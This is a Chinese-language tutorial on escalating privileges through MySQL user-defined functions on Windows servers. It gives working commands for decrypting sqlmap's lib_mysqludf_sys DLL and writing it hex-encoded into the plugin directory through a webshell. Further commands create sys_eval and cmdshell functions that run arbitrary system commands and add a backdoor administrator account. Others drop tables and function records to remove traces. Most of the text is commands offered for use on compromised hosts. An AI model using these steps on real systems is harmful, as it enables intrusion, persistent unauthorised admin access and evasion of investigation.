# UDF

## 1、提权过程

### 1、UDF

UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。

### 2、windows下udf提权的条件 <a id="0x02-windows&#x4E0B;udf&#x63D0;&#x6743;&#x7684;&#x6761;&#x4EF6;"></a>

1、如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/  
2、如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。  
3、掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。  
4、拥有可以将udf.dll写入相应目录的权限。

### 3、提权方法 <a id="0x03-&#x63D0;&#x6743;&#x65B9;&#x6CD5;"></a>

如果是mysql5.1及以上版本，必须要把udf.dll文件放到mysql安装目录的lib\plugin文件夹下才能创建自定义函数。该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录。

```text
/*

sqlmap\udf\mysql\windows\32目录下存放着lib_mysqludf_sys.dll_

sqlmap\udf\mysql\windows\64目录下为64位的lib_mysqludf_sys.dll_

*/
```

首先进入到 sqlmap\extra\cloak\cloak 目录下，执行命令：

```text
cloak.py -d -i D:\sqlmap\udf\mysql\windows\32\lib_mysqludf_sys.dll_
```

解密之后会在当前目录下生成dll文件。

将dll文件复制到mysql的/lib/plugin目录下，执行

```text
create function sys_exec returns string soname "lib_mysqludf_sys.dll";
```

攻击者可以利用lib\_mysqludf\_sys提供的函数执行系统命令。

执行命令：

```text
select sys_eval(‘whoami’);
```

```text
/*

函数介绍：

sys_eval，执行任意命令，并将输出返回。

sys_exec，执行任意命令，并将退出码返回。

sys_get，获取一个环境变量。

sys_set，创建或修改一个环境变量。

*/
```

## 2、原理

提权过程：

1、将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下）  
2、从udf文件中引入自定义函数\(user defined function\)  
3、执行自定义函数

第一步，拿到一个网站的webshell之后，在指定位置创建udf文件。

如何创建？

sqlmap中有现成的udf文件，分为32位和64位，一定要选择对版本，否则会显示：Can't open shared library 'udf.dll'。

然后将获得的udf.dll文件转换成16进制，一种思路是在本地使用mysql函数hex：

```text
SELECT hex(load_file(0x433a5c5c55736572735c5c6b61316e34745c5c4465736b746f705c5c6c69625f6d7973716c7564665f7379732e646c6c)) into dumpfile 'C:\\Users\\ka1n4t\\Desktop\\gg.txt';
```

load\_file中的十六进制是C:\Users\ka1n4t\Desktop\lib\_mysqludf\_sys.dll  
此时gg.txt文件的内容就是udf文件的16进制形式。

接下来就是把本地的udf16进制形式通过我们已经获得的webshell传到目标主机上。

```text
CREATE TABLE udftmp (c blob); //新建一个表，名为udftmp，用于存放本地传来的udf文件的内容。
INSERT INTO udftmp values(unhex('udf文件的16进制格式')); //在udftmp中写入udf文件内容
SELECT c FROM udftmp INTO DUMPFILE 'H:\\PHPStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll'; 
//将udf文件内容传入新建的udf文件中，路径根据自己的@@basedir修改
//对于mysql小于5.1的，导出目录为C:\Windows\或C:\Windows\System32\
```

上面第三步，mysql5.1以上的版本是默认没有plugin目录的，网上有说可以使用ntfs数据流创建：

```text
select test into dumpfile 'H:\\PHPStudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION';
```

但是我本地测试一直没有成功。后来又在网上看了很多，都是用这种方法，看来是无解了。在t00ls上也有人说数据流从来没有成功过，所以说mysql5.1以上的提权能否成功还是个迷。  
为了演示，在这里我是手工创建了个plugin目录\(ps: 勿喷啦，我用的phpstudy环境，重新安装一个mysql的话有可能会冲突，所以就没搞，毕竟原理都一样\)。

继续，到这儿如果没有报错的话就说明已经在目标主机上成功生成了udf文件。下面要导入udf函数：

```text
1. DROP TABLE udftmp; //为了删除痕迹，把刚刚新建的udftmp表删掉
2. CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; //导入udf函数
导入成功的话就可以使用了：
```

```text
SELECT sys_eval('ipconfig');
返回网卡信息
```

附几个常用的cmd指令，用于添加一个管理员用户：

```text
net user ka1n4t ka1n4t~!@ /add //添加新用户：ka1n4t，密码为ka1n4t~!@
net localgroup administrators ka1n4t /add //将ka1n4t添加至管理员分组
```

#### 1、提权原理： <a id="1&#x63D0;&#x6743;&#x539F;&#x7406;"></a>

利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库

#### 2、数据库版本为 5.0 以下的： <a id="2&#x6570;&#x636E;&#x5E93;&#x7248;&#x672C;&#x4E3A;-50-&#x4EE5;&#x4E0B;&#x7684;"></a>

如果是 win 2000 的服务器，我们则需要将 udf.dll 文件导出到 C:\Winnt\udf.dll 下。

如果是 win2003 服务器，我们则要将 udf.dll 文件导出在 C:\Windows\udf.dll 下。

#### 3、数据库版本为 5.1 以上的： <a id="3&#x6570;&#x636E;&#x5E93;&#x7248;&#x672C;&#x4E3A;-51-&#x4EE5;&#x4E0A;&#x7684;"></a>

我们则需要将 dll 文件导出到 mysql 安装目录的 lib\plugin\ 下，才能创建自定义函数。注：如果没有 plugin 目录，我们可以进行手动创建！

#### 4、udf提权的两种姿势 <a id="4udf&#x63D0;&#x6743;&#x7684;&#x4E24;&#x79CD;&#x59FF;&#x52BF;"></a>

1：通过大马的MySQL提权功能，成功导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd 命令，来执行提权操作。注：在此之前，我们应执行版本查看语句，来确认当前MySQL的版本信息！

```text
net user secist secist.com /add

net localgroup administrators secist /add
```

2：直接在目标服务器上传 udf.php 此类的提权脚本提权。

方法是一样的，先导出 dll 文件到正确位置。

再在自定义SQL语句执行框内，执行以下命令，来创建调用函数并进行提权！

```text
create function cmdshell returns string soname ‘udf.dll’;                创建 cmdshell 调用函数
select cmdshell(‘net user secist secist.com /add’);                           添加用户
select cmdshell(‘net localgroup administrators secist /add’);           将用户加到管理组
drop function cmdshell;                                                                      删除函数
delete from mysql.func where name='cmdshell';                                 删除函数
```

